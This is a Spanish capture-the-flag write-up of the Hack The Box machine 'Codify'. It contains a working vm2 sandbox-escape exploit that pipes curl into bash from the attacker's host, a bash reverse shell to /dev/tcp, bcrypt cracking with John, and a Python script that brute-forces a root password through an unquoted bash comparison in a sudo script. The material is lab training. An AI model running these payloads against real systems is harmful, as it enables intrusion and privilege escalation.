
# Codify

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.11.239` a través del navegador. Está bloqueado, a si que añadimos el host a nuestro /etc/hosts:

```bash
sudo nano /etc/hosts
```

Ahora ya se muestra la web en el navegador:

<figure><img src="/files/vLsYEsgCXRVTjhYNbYsG" alt=""><figcaption></figcaption></figure>

A primera vista parece una web para probar código en JS desde el navegador, un sandbox.

<figure><img src="/files/Mq22iDEgvKAol6aaBE6m" alt=""><figcaption></figcaption></figure>

Nos encontramos con algunas limitaciones en el entorno:

<figure><img src="/files/agKuppCsugFqjJj2xKis" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo con Nmap</mark>

```bash
sudo nmap -v -sS -sV -sC --script vuln 10.10.11.239
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos un puerto 3000 abierto que corre un servicio de Node.js

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con gobuster o dirsearch no encontramos ningún directorio interesante. En la página About Us encontramos un link interesante a un repositorio de github sobre la versión utilizada en el editor de codigo:

<figure><img src="/files/SYa4BkEsof8QDTBHf89V" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/patriksimek/vm2>" %}

## <mark style="color:purple;">Exploit</mark>

Mientras buscaba vulnerabilidades recientes en la biblioteca vm2, encontré una rastreada como `CVE-2023–30547` . Esta vulnerabilidad permite eludir las restricciones de la zona de pruebas, lo que permite la ejecución de código arbitrario en el contexto del host.

{% embed url="<https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/?source=post_page-----933488bfbfff-------------------------------->" %}

Creamos un archivo `exploit.js` con el siguiente script, modificando nuestra IP tun0 con un puerto 8000 abierto:

{% code overflow="wrap" %}

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.123:8000 | bash');
}
`

console.log(vm.run(code))
```

{% endcode %}

También vamos a crear un archivo `index.html` que va a contener una reverse shell que se ejecutará automáticamente al enviar el script al sandbox:

{% code title="index.html" %}

```bash
#! bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.123/1234 0>&1'
```

{% endcode %}

Abrimos un python http server, un listener de netcat, y enviamos el script por el sandbox, obteneniendo una reverse shell:&#x20;

```bash
python3 -m http.server
```

```bash
nc -nlvp 1234
```

<figure><img src="/files/3FawYonQcHAWMAZkJQQc" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/jzO15zvuQ1LZiSjKmitJ" alt=""><figcaption></figcaption></figure>

Somos el usuario `svc` , tambien hay otro usuario `joshua` al que no podemos acceder:

```shell-session
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ pwd
pwd
/home/svc
svc@codify:~$ cd ..
cd ..
svc@codify:/home$ ls
ls
joshua
svc
svc@codify:/home$ cd joshua
cd joshua
bash: cd: joshua: Permission denied
```

En el directorio `var/www/contact`, encontré un archivo de base de datos SQLite que contiene un nombre de usuario y un hash de contraseña de bcrypt.

{% code overflow="wrap" %}

```shell-session
svc@codify:/var/www/contact$ ls
index.js
package.json
package-lock.json
templates
tickets.db

svc@codify:/var/www/contact$ cat tickets.db

T5Tite format 3@  .WJ
   otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
Gjoshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

joshua  users
             tickets
r]rh%%Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open ;wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!
```

{% endcode %}

{% code title="hash\_joshua" %}

```
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

{% endcode %}

Hashcat estaba tardando demasiado en descifrar, así que intenté usar John y logró descifrar la contraseña en solo unos minutos.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_joshua --format=bcrypt 

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

spongebob1       (?) 
```

Ya tenemos usuario y contraseña:

```
Usuario: joshua
Password: spongebob1
```

Vamos a acceder por SSH y obtenemos el user flag:

```shell-session
ssh joshua@codify.htb
spongebob1

Last login: Mon Nov 13 20:55:53 2023 from 10.10.15.39
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt
61688544364c29f9c9d2c30dba3a8a1e
```

## <mark style="color:purple;">Escalada de privilegios</mark>

Vemos los permisos que tiene joshua:

```shell-session
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Este es el script que puede ejecutar:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

No podemos ejecutarlo directamente:

```shell-session
joshua@codify:~$ bash /opt/scripts/mysql-backup.sh
/usr/bin/cat: /root/.creds: Permission denied
Enter MySQL password for root: 
Password confirmation failed!
```

Mientras investigaba posibles riesgos de seguridad en los scripts Bash, descubrí una práctica insegura en el script bash de MySQL: la comparación de variables sin comillas.

{% embed url="<https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md?source=post_page-----933488bfbfff-------------------------------->" %}

```
Variable expansion:
    Good: "$my_var"
    Bad: $my_var

Command substitution:
    Good: "$(cmd)"
    Bad: $(cmd)
```

Según la información proporcionada, si el lado derecho de `==` en un script de Bash no está encerrado entre comillas, Bash interpretará la expresión como una coincidencia de patrones en lugar de tratarla como una cadena.

En este contexto, aprovecharemos este comportamiento mediante el patrón `{valid_password_char}{*}`. Esto sugiere que cualquier carácter seguido de cualquier número de caracteres podría coincidir potencialmente.

Al explotar este patrón, es posible manipular la comparación de variables para aceptar una gama más amplia de entradas, posiblemente eludiendo las comprobaciones de contraseñas o logrando un comportamiento no deseado en el script.

Puede intentarse adivinar o forzar el carácter de contraseña inicial seguido de `*` para omitir la solicitud de contraseña. Además, es viable aplicar fuerza bruta de manera sistemática a cada carácter de la contraseña hasta identificar con éxito todos los caracteres.

A continuación, se presenta el script en Python que utilicé para llevar a cabo la fuerza bruta y extraer la contraseña de root:

{% code title="root.py" %}

```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

{% endcode %}

Vamos a crear un directorio temporal para ejecutar el script de bruteforce en python:

```shell-session
joshua@codify:~$ mktemp -d
/tmp/tmp.s8WkeWAxcb

joshua@codify:~$ cd /tmp/tmp.s8WkeWAxcb

joshua@codify:/tmp/tmp.s8WkeWAxcb$ vim root.py

joshua@codify:/tmp/tmp.s8WkeWAxcb$ ls
root.py

joshua@codify:/tmp/tmp.s8WkeWAxcb$ python3 root.py
[sudo] password for joshua: 
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

El script funciona y al ejecutar el comando su y introducir el password ya somos root:

```shell-session
joshua@codify:/tmp/tmp.s8WkeWAxcb$ sudo su
Sorry, user joshua is not allowed to execute '/usr/bin/su' as root on codify.
joshua@codify:/tmp/tmp.s8WkeWAxcb$ su
Password: 
root@codify:/tmp/tmp.s8WkeWAxcb# whoami
root
root@codify:/tmp/tmp.s8WkeWAxcb# cd
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt 
cee656ed2ad4250ac2110d273425e7df
```
